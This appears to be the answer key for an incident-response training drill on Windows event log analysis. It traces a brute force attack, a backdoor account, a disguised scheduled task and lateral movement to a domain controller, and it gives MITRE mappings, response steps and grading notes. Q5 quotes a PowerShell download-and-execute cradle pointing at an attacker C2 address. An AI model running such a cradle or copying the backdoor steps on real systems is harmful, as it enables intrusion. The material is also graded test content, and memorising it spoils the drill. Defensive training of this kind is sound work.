# Drill 01 Solution: Windows Event Log Analysis

**Maximum score: 20 points**
**Full marks require:** Correct identification, specific evidence citations, MITRE mapping

---

## Q1 — Classification (2 points)

**Answer:** This is a **network brute force attack** against the local `administrator` account over SMB/network logon (Type 3).

**Evidence:**

* 24 consecutive EventID 4625 (failed logons) against `TargetUserName: administrator`
* All from the same source IP: `192.168.50.201`
* Same pattern: LogonType 3, FailureReason `%%2313` (wrong password)
* Rapid succession: all 24 failed attempts occurred within ~2.5 minutes (02:01:12 to 02:03:47)
* Each attempt increments the source port (51022 → 51045) — indicating a scripted/automated tool

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

**Full credit:** Names the attack, cites event numbers, notes the automation indicator (incrementing ports), provides MITRE ID.

---

## Q2 — Logon Type Analysis (2 points)

**a) LogonType 3 meaning:**
Network logon — the client is connecting remotely over the network (SMB, file share, etc.) without an interactive session.
The credentials are validated over the network.

**b) Why NTLM is concerning:**
In a properly configured Active Directory domain, servers should use Kerberos for authentication, not NTLM.
NTLM appearing here suggests either:

1. The `administrator` account being targeted is a **local administrator** (not a domain account) — Kerberos is only available for domain accounts
1. NTLM is being forced, which can indicate a pass-the-hash attack or a misconfigured environment
1. The attacker may be using a tool that forces NTLM downgrade

**c) NTLM V1 security implications:**
NTLM Version 1 is significantly weaker than NTLMv2.
NTLMv1 uses DES-based challenge-response hashes that can be cracked offline in hours with modern hardware.
Any captured NTLMv1 exchange is at high risk of offline password recovery.
This indicates the server's SMB security is not configured to enforce NTLMv2 minimum.

---

## Q3 — Post-Exploitation Analysis (3 points)

**a) Event 26 — Reconnaissance:**
The attacker ran three commands chained together:

* `whoami` — confirms which user they're running as (confirms admin privileges)
* `net user` — lists all local user accounts (enumerates the attack surface)
* `net localgroup administrators` — lists who has local admin rights

This is **post-exploitation reconnaissance** to understand the environment.
The `TokenElevationType: %%1937` (Full Token) confirms the process has full admin privileges.

**b) Events 27–28 — Backdoor Account Creation:**

* Event 27: Created a new user account named `hacker` with password `Password123!`
* Event 28: Added `hacker` to the local `Administrators` group

This gives the attacker a persistent backdoor account with full admin access that survives a password change of the `administrator` account.

**c) MITRE ATT&CK:**

* T1136.001 — Create Account: Local Account
* T1098 — Account Manipulation (adding to admins group)

---

## Q4 — Persistence Mechanism (2 points)

**a) Three red flags in Event 29:**

1. **Task name mimics legitimate Microsoft task:** `\Microsoft\Windows\WindowsDefender\Scan` — designed to blend in with real Windows Defender scanning tasks. A SOC analyst or admin glancing at the task list would likely dismiss it.

1. **Executable in suspicious location:** `C:\ProgramData\Microsoft\scan.exe` — while `ProgramData` looks legitimate, the actual executable name and path don't match any known legitimate Windows Defender file (`MpCmdRun.exe` is the real command-line tool).

1. **BootTrigger:** The task runs at every system boot with `RunLevel: HighestAvailable` (administrator privileges). This is not how Windows Defender actually schedules its tasks, and it ensures the backdoor restarts after any reboot.

**b) MITRE ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task

---

## Q5 — Lateral Movement (3 points)

**a) Event 30 — Lateral Movement to DC:**
`192.168.50.101` is the IP address of `FILESERVER01` (the originally compromised server).
A successful network logon (Type 3) to `DC01.corp.local` from `FILESERVER01's` IP means the attacker used credentials obtained from `FILESERVER01` to authenticate against the **Domain Controller**.

The attacker is moving laterally from the compromised file server to the domain controller using the administrator credentials they brute-forced.

**b) Event 31 — Malicious PowerShell on DC:**
The attacker ran PowerShell with a download-and-execute cradle:

```text
IEX(New-Object Net.WebClient).DownloadString('http://185.234.219.47/dc.ps1')
```

This downloads a script from the attacker's C2 server (`185.234.219.47`) and executes it in memory.
Given the target is the DC, this script likely deploys a more powerful implant or attempts to dump the AD database (DCSync, NTDS.dit).

**c) Why DC compromise is catastrophic:**
A compromised Domain Controller means the attacker can:

* Dump ALL Active Directory password hashes (every user in the organization)
* Create Golden Tickets (Kerberos forgery enabling persistent domain-wide access)
* Create new domain admin accounts
* Modify Group Policy to deploy malware to all domain-joined systems
* Gain access to all systems trusted by the domain

This elevates from a single server compromise to a full **domain compromise** — the worst possible outcome in a Windows environment.

---

## Q6 — Timeline Construction (3 points)

| Time | Event | MITRE Technique |
|------|-------|----------------|
| 02:01:12–02:03:47 | Brute force attack (24 attempts) against `administrator` on FILESERVER01 | T1110.001 |
| 02:03:51 | Brute force succeeds — attacker gains access to local administrator account | — |
| 02:04:15 | Post-exploitation reconnaissance: `whoami`, `net user`, `net localgroup` | T1087.001 |
| 02:04:18 | Backdoor account `hacker` created | T1136.001 |
| 02:04:19 | `hacker` added to local Administrators group | T1098 |
| 02:05:30 | Scheduled task `WindowsDefender\Scan` created for boot persistence | T1053.005 |
| 02:08:42 | Lateral movement: FILESERVER01 → DC01 using `administrator` credentials | T1021.002 |
| 02:09:01 | Malicious PowerShell on DC01: downloads and executes `dc.ps1` from C2 | T1059.001, T1105 |

---

## Q7 — Response Actions (3 points)

**Priority 1 (Immediate — within 5 minutes):**

1. **Isolate DC01** from the network (or block all inbound connections except from management)

   *Why:* DC01 is in the process of being compromised.
   The PowerShell script is executing.
   Every second counts.
   Domain compromise is irreversible without a full forest recovery.

1. **Block outbound to 185.234.219.47** at the perimeter firewall and proxy

   *Why:* The C2 is actively being used.
   Cutting this kills the `dc.ps1` download and any further commands.

**Priority 2 (Within 10 minutes):**

1. **Isolate FILESERVER01** (network quarantine)

   *Why:* The original compromised host.
   Contains malicious files, backdoor account, and persistence.

1. **Disable local `administrator` account on FILESERVER01** and reset the password domain-wide for any shared admin credentials

   *Why:* The attacker knows this password.
   They may use it on other systems.

1. **Disable the `hacker` account** (if on domain, remove from AD; if local, remove from all systems)

   *Why:* Direct backdoor that survives a password reset of `administrator`.

**Priority 3 (Within 30 minutes):**

1. **Delete the malicious scheduled task** on FILESERVER01
1. **Assess DC01 for full indicators of compromise** (golden ticket, new domain accounts, GPO changes)
1. **Conduct fleet-wide hunt** for:
   * `192.168.50.201` — find the source of the brute force (is this internal?)
   * User `hacker` on all systems
   * Connections to `185.234.219.47`

---

## Q8 — Detection Gap (2 points)

**Better detection points, from earliest to latest:**

1. **Velocity-based brute force alert at Event 3 or 5** (not waiting for success):

   Rule: `5+ Event 4625 against the same account from the same source within 60 seconds → ALERT MEDIUM`
   This would have fired at approximately 02:01:20 — over 2.5 minutes before the attack succeeded.

1. **Account lockout policy** — if the `administrator` account had a lockout policy (e.g., 10 failed attempts → lockout for 30 minutes), the attack would have been automatically blocked. Local administrator accounts often don't have lockout policies by default.

1. **Disable/rename the local `administrator` account** — the `Administrator` account is the most commonly brute-forced account. Renaming it to something non-obvious and creating a different emergency admin account significantly reduces attack surface.

1. **Endpoint exposure** — `FILESERVER01` should not have port 445 (SMB) or 3389 (RDP) accessible from arbitrary internal hosts. Network segmentation and access control lists would have prevented the brute force attempt entirely.

**Grading note:** Full credit for identifying alert-before-success detection AND explaining WHY the current approach failed (no lockout on local admin, or alert threshold too high).
